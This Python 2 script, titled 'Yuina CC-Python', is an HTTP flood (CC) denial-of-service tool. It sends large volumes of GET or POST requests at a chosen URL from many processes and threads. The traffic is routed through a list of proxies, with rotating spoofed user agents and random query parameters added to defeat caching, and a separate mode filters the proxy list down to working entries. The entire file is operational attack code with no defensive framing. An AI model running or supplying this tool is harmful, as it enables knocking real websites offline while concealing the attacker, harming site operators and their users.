#!/usr/bin/env python
# -*- coding: UTF-8 -*-
import requests
import threading
import argparse
import time
import sys
import os
import random
import string

from multiprocessing import Process
from multiprocessing import Pool as ProcessPool
from multiprocessing.dummy import Pool as ThreadPool


UserAgent = [
'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0)',
'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.2)',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)',
'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/7.0; .NET4.0C; .NET4.0E)',
'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
'Mozilla/5.0 (Windows; U; Windows NT 5.2) Gecko/2008070208 Firefox/3.0.1',
'Mozilla/5.0 (Windows; U; Windows NT 5.1) Gecko/20070803 Firefox/1.5.0.12',
'Mozilla/5.0 (Macintosh; PPC Mac OS X; U; en) Opera 8.0',
'Opera/8.0 (Macintosh; PPC Mac OS X; U; en)',
'Opera/9.27 (Windows NT 5.2; U; zh-cn)',
'NetSurf/3.6 (Linux)',
'Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.27 Safari/525.13',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.12) Gecko/20080219 Firefox/2.0.0.12 Navigator/9.0.0.6',
'Mozilla/5.0 (iPhone; U; CPU like Mac OS X) AppleWebKit/420.1 (KHTML, like Gecko) Version/3.0 Mobile/4A93 Safari/419.3',
'Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/525.13 (KHTML, like Gecko) Version/3.1 Safari/525.13',
'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.1924.87 Mobile Safari/537.36',
'Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1',
'Mozilla/5.0 (Linux; Android 8.0; Pixel 2 Build/OPD3.170816.012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.0; SLA-AL00 Build/HUAWEISLA-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.3.1260(0x26060339) NetType/4G Language/zh_CN',
'Mozilla/5.0 (Linux; Android 7.0; SLA-AL00 Build/HUAWEISLA-AL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36',
'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.152 Safari/537.22',
'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.0 Mobile/14G60 Safari/602.1',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0',
'Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaN8-00/012.002; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.0 Mobile Safari/533.4 3gpp-gba',
'Mozilla/5.0 (Linux;u;Android 4.2.2;zh-cn;) AppleWebKit/534.46 (KHTML,like Gecko) Version/5.1 Mobile Safari/10600.6.3 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134',
'Mozilla/5.0 (X11; Linux armv7l) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.89 Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.0; MI 5 Build/NRD90M-wesley_iui-18.03.19; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 Mobile Safari/537.36 V1_AND_SQ_7.6.0_832_YYB_D QQ/7.6.0.3525 NetType/WIFI WebP/0.4.1 Pixel/1080',
'Mozilla/5.0 (AppleWebKit/537.1; Chrome50.0; Windows NT 6.3; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)',
'Mozilla/5.0 (Linux; Android 7.0; MI 5 Build/NRD90M-wesley_iui-18.03.19; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/044029 Mobile Safari/537.36 V1_AND_SQ_7.5.8_818_YYB_D QQ/7.5.8.3490 NetType/WIFI WebP/0.3.0 Pixel/1080',
'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko',
'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)',
'Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0',
'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0',
'Mozilla/5.0 (Linux; Android 9; SKW-A0 Build/SKYW2001110CN00MP7; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/76.0.3809.89 Mobile Safari/537.36 T7/11.19 SP-engine/2.15.0 baiduboxapp/11.19.5.10 (Baidu; P1 9)',
'Mozilla/5.0 (Linux; U; Android 7.1.1; zh-CN; vivo Xplay6 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.8.5.1065 Mobile Safari/537.36',
'Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/7.0.10(0x17000a21) NetType/2G Language/zh_CN',
]

spiderUserAgent =[
'zspider/0.9-dev http://feedback.redkolibri.com/',
'Xaldon_WebSpider/2.0.b1',
'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
'Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)'
'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0); 360Spider',
'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36; 360Spider',
'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
'YisouSpider',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) Speedy Spider (http://www.entireweb.com/about/search_tech/speedy_spider/)',
'Mozilla/5.0 (compatible; Speedy Spider; http://www.entireweb.com/about/search_tech/speedy_spider/)',
'Speedy Spider (Entireweb; Beta/1.3; http://www.entireweb.com/about/search_tech/speedyspider/)',
'Speedy Spider (Entireweb; Beta/1.2; http://www.entireweb.com/about/search_tech/speedyspider/)',
'Speedy Spider (Entireweb; Beta/1.1; http://www.entireweb.com/about/search_tech/speedyspider/)',
'Speedy Spider (Entireweb; Beta/1.0; http://www.entireweb.com/about/search_tech/speedyspider/)',
'Speedy Spider (Beta/1.0; www.entireweb.com)',
'Speedy Spider (http://www.entireweb.com/about/search_tech/speedy_spider/)',
'Speedy Spider (http://www.entireweb.com/about/search_tech/speedyspider/)',
'Speedy Spider (http://www.entireweb.com)',
'Sosospider+(+http://help.soso.com/webspider.htm)',
'sogou spider',
'Nusearch Spider (www.nusearch.com)',
'nuSearch Spider (compatible; MSIE 4.01; Windows NT)',
'lmspider (lmspider@scansoft.com)',
'lmspider lmspider@scansoft.com',
'ldspider (http://code.google.com/p/ldspider/wiki/Robots)',
'iaskspider/2.0(+http://iask.com/help/help_index.html)',
'iaskspider',
'hl_ftien_spider_v1.1',
'hl_ftien_spider',
'FyberSpider (+http://www.fybersearch.com/fyberspider.php)',
'FyberSpider',
'everyfeed-spider/2.0 (http://www.everyfeed.com)',
'envolk[ITS]spider/1.6 (+http://www.envolk.com/envolkspider.html)',
'envolk[ITS]spider/1.6 ( http://www.envolk.com/envolkspider.html)',
'Baiduspider+(+http://www.baidu.com/search/spider_jp.html)',
'Baiduspider+(+http://www.baidu.com/search/spider.htm)',
'BaiDuSpider',
'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0) AddSugarSpiderBot www.idealobserver.com',
'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
]

def get_parse():
	parser = argparse.ArgumentParser(description='Yuina CC-Python')
	parser.add_argument('-c', help="检查代理可用性及检查线程数. 例如: -c 100", action="store", dest="c" , default=0, type=int)
	parser.add_argument('-u', help="CC的目标URL, 例如: -u 'https://www.baidu.com/s?wd=xiaozhansima' ", action="store", dest="u")
	parser.add_argument('-j', help="CC总次数,默认为100000, 例如: -j 1000000", action="store", dest="j", default=1, type=int)
	parser.add_argument('-p', help="CC进程数,5个进程, 例如: -p 2", action="store", dest="p", default=1, type=int)
	parser.add_argument('-t', help="CC线程数,默认100线程, 例如: -t 100", action="store", dest="t", default=1 ,type=int)
	parser.add_argument('-m', help="攻击方法,默认GET, 例如: -m GET", action="store", dest="m", default="GET")
	parser.add_argument('-d', help="CC-Post数据, 例如: -d 'a=1&b=2&c=<rand>' 其中<rand>就是一个随机数", action="store", dest="d")
	if(len(sys.argv) < 2):
		parser.print_help()
		sys.exit()
	return parser.parse_args()

def Version():
	pass

def read_proxy():
	f = open('./proxy.txt', 'r')
	proxies = f.readlines()
	f.close()
	return proxies


def split_list(proxies , pnum):
	tmp_proxy = []
	for i in range(0, len(proxies), len(proxies)/ pnum):
		b = proxies[i: i + len(proxies) / pnum]
		tmp_proxy.append(b)
	return tmp_proxy


def make_headers():
	tmp_header = {}
	tmp_header['User-Agent'] = random.choice(UserAgent)
	tmp_header['Referer'] = 'http://www.baidu.com'
	tmp_header['Cache-Control'] = 'no-cache'
	return tmp_header


def make_data(post):
	tmp_post = {}
	tmp_data = post.split("&")
	for i in tmp_data:
		tmp_arr = i.split("=")
		tmp_post[tmp_arr[0]] = tmp_arr[1]
	print tmp_post
	return tmp_post

def random_parameters(url):
	items = ['1','2','3','4','5','6','7','8','9','0','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
	randomstring = string.join(random.sample(items, 10)).replace(" ","")
	url = url.replace('<rand>',randomstring)
	if url.find('?') >= 0:		
		url = url + "&_random=" + randomstring
	else:
		url = url + "/?_random=" + randomstring
	return url


def cc_website((proxy, url, jobs, method, post)):
	theader = {}
	theader = make_headers()
	tmp_proxy = {}
	tmp_proxy['http'] = 'http://%s' % (proxy.strip())
	tmp_proxy['https'] = 'https://%s' % (proxy.strip())
	data_post = {}
	if method.upper == 'POST':		
		data_post = make_data(post)
	while jobs > 0:
		tmp_url = random_parameters(url)
		if method.upper() == 'POST':
			try:
				getrequests = requests.post(tmp_url, headers= theader, proxies = tmp_proxy ,data = data_post ,timeout = 10)
				if getrequests.status_code == 200:
					print 'Attack website %s success' % (tmp_url)
					print 'Use proxy %s success' % (proxy.strip())
			except Exception, e:
				pass
		elif method.upper() == 'GET':
			try:
				getrequests = requests.get(tmp_url, headers= theader, proxies = tmp_proxy ,timeout = 10)
				if getrequests.status_code == 200:
					print 'Attack website %s success' % (tmp_url)
					print 'Use proxy %s success' % (proxy.strip())
			except Exception, e:
				pass
		jobs -= 1	


def mk_threading(proxies, url ,jobs, threadnum ,method ,post):
	threadsPool = ThreadPool(threadnum)
	try:
		result = threadsPool.map(cc_website , map(lambda x:(x, url, jobs, method, post), proxies)) 
		threadsPool.close()
		threadsPool.join()
	except Exception, e:
		pass

def mk_process(proxies, url ,jobs, processnum, threadnum ,method ,post):
	Processpools = ProcessPool(processnum)
	for i in range(processnum):
		Processpools.apply_async(mk_threading, args=(proxies[i], url ,jobs, threadnum ,method ,post))
	print 'CC start...'
	print 'Waiting for all subprocesses done...'
	Processpools.close()
	Processpools.join()
	print 'All subprocesses done.'


def attack_cc(url ,jobs, processnum, threadnum ,method ,post):

	proxies = read_proxy()

	proxies = split_list(proxies , processnum)

	mk_process(proxies, url ,jobs, processnum, threadnum ,method ,post)


def add_proxy(proxy):
	global profile
	profile.write(proxy)

def check_proxy(proxy):
	tmp_proxy = {}
	tmp_proxy['http'] = 'http://%s' % (proxy.strip())
	tmp_proxy['https'] = 'https://%s' % (proxy.strip())
	url = 'g.alicdn.com'
	try:
		getrequests = requests.get("http://"+url+"/", proxies = tmp_proxy , timeout=10)
		if getrequests.status_code == 200:
			if getrequests.content.find(url) != -1:
				print 'Add proxy %s success' % (proxy.strip())
				add_proxy(proxy)
	except Exception, e:
		pass


def check_proxies(num):
	global profile
	proxies = read_proxy()
	proxies = list(set(proxies))
	profile = open('./proxy.txt', 'w')
	threadsPool = ThreadPool(num)
	result = threadsPool.map(check_proxy, proxies)
	threadsPool.close()
	threadsPool.join()


def test():
	theader = {}

	theader = make_headers()
	tmp_proxy = {}
	tmp_proxy['http'] = 'http://c.com:3127' 
	getrequests = requests.get("http://xlixli.net/test.php", proxies = tmp_proxy)
	print getrequests.content


def main(argv):
	args = get_parse()
	if args.c != 0:
		check_proxies(args.c)
	else:
		attack_cc(args.u, args.j, args.p, args.t ,args.m ,args.d)

if __name__ == '__main__':	
	main(sys.argv)
